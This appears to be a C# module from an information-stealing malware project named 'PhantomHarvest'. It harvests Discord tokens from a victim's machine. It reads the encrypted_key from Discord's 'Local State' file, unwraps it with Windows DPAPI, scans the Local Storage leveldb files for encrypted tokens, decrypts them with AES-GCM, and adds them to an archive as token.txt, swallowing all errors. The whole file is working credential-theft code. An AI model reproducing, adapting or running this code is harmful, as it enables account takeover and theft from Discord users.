using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Messengers
{
	// Token: 0x02000013 RID: 19
	internal class Discord
	{
		public static void Collect(ArchiveManager zip)
		{
			foreach (KeyValuePair<string, string> keyValuePair in Discord.DiscordPaths)
			{
				try
				{
					byte[] masterKey = Discord.GetMasterKey(keyValuePair.Value);
					if (masterKey != null)
					{
						string token = Discord.GetToken(keyValuePair.Value, masterKey);
						if (!string.IsNullOrEmpty(token))
						{
							using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(token)))
							{
								zip.AddStream(ArchiveManager.Compression.Deflate, keyValuePair.Key + "/token.txt", ms, DateTime.Now, "");
							}
						}
					}
				}
				catch
				{
				}
			}
		}

		public static byte[] GetMasterKey(string path)
		{
			string path2 = Path.Combine(path, "Local State");
			byte[] array = new byte[0];
			if (!File.Exists(path2))
			{
				return null;
			}
			
			try
			{
				byte[] fileBytes = LockedFile.ReadLockedFile(path2);
				if (fileBytes == null) return null;
				string content = Encoding.UTF8.GetString(fileBytes);
				
				foreach (object obj in new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(content.Replace(" ", "")))
				{
					Match match = (Match)obj;
					if (match.Success)
					{
						array = Convert.FromBase64String(match.Groups[1].Value);
					}
				}
				byte[] array2 = new byte[array.Length - 5];
				Array.Copy(array, 5, array2, 0, array.Length - 5);
				return ProtectedData.Unprotect(array2, null, DataProtectionScope.CurrentUser);
			}
			catch
			{
				return null;
			}
		}

		public static string GetToken(string path, byte[] key)
		{
			StringBuilder stringBuilder = new StringBuilder();
			string levelDbPath = Path.Combine(path, "Local Storage\\leveldb");
			if (Directory.Exists(levelDbPath))
			{
				foreach (string path2 in Directory.GetFiles(levelDbPath, "*.l??"))
				{
					try
					{
						byte[] fileBytes = LockedFile.ReadLockedFile(path2);
						if (fileBytes != null)
						{
							// leveldb 文件可能很大且是二进制的，但我们正在查找字符串。
							// Encoding.Default 或 UTF8 应该可以用于查找正则表达式模式。
							string input = Encoding.Default.GetString(fileBytes);
							
							if (key != null)
							{
								foreach (object obj in Regex.Matches(input, "dQw4w9WgXcQ:([^.*\\['(.*)'\\].*$][^\"]*)"))
								{
									try
									{
										byte[] source = Convert.FromBase64String(((Match)obj).Groups[1].Value);
										byte[] array = source.Skip(15).ToArray<byte>();
										byte[] iv = source.Skip(3).Take(12).ToArray<byte>();
										byte[] array2 = array.Skip(array.Length - 16).ToArray<byte>();
										array = array.Take(array.Length - array2.Length).ToArray<byte>();
										byte[] bytes = new AesGcm().Decrypt(key, iv, null, array, array2);
										string @string = Encoding.UTF8.GetString(bytes);
										stringBuilder.AppendLine(@string);
									}
									catch {}
								}
							}
						}
					}
					catch
					{
					}
				}
			}
			return stringBuilder.ToString();
		}

		public static string MessengerName = "Discord";

		public static Dictionary<string, string> DiscordPaths = new Dictionary<string, string>
		{
			{
				"Discord",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Discord")
			},
			{
				"Discord PTB",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DiscordPTB")
			},
			{
				"Discord Canary",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DiscordCanary")
			}
		};
	}
}
